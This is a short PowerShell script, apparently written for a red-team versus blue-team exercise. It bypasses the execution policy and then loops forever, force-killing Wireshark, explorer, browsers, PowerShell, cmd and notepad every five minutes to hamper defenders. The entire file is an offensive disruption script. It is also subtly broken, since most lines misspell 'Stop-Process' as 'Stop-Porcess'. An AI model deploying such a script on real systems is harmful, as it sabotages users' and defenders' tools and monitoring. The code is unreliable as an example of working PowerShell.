#Scipt loops indefinetly killing programs the blueteam is likely to be using with a built in sleep function to space out the kiling of programs. Gives the blue team brief windows to work
set-executionpolicy -Scope CurrentUser bypass
while($true)
{
    Stop-Process -Force -Name Wireshark
    Stop-Porcess -Force -Name explorer
    Stop-Porcess -Force -Name MicrosoftEdge
    Stop-Porcess -Force -Name Chrome
    Stop-Porcess -Force -Name Firefox
    Stop-Porcess -Force -Name powershell
    Stop-Porcess -Force -Name cmd
    Stop-Porcess -Force -Name notepad
    Start-Sleep -s 300
}
